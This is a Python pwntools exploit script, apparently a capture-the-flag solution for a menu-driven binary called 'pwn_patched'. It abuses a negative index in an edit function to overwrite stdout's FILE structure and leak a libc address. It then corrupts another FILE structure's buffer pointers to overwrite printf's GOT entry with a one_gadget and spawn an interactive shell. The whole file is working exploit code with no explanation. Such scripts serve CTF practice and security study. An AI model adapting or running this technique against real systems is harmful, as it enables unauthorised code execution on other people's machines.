from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(idx):
    sla(b'chioce:', str(idx).encode())

def add(idx, size, content):
    menu(1)
    sla(b'Index :', str(idx).encode())
    sla(b'Size :', str(size).encode())
    sa(b'Content :', content)

def edit(idx, size, content):
    menu(2)
    sla(b'Index :', idx)
    sla(b'Size :', str(size).encode())
    sa(b'Content :', content)

def show(idx):
    menu(3)
    sla(b'Index :', str(idx).encode())

#debug('''
#    b *0x400961
#    b *0x400a54
#''')

payload = p64(0xfbad1800) + p64(0) * 3 + b'\x00'
edit(b'-24', 0x100, payload)
libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['_IO_file_jumps']

one = libc.address + 0xf03a4
printf_got = 0x602030
payload = p64(0xfbad208b) + p64(0) * 6 + p64(printf_got) + p64(printf_got + 8)

edit(b'-22', 0x90, payload)

s(p64(one))

shell()
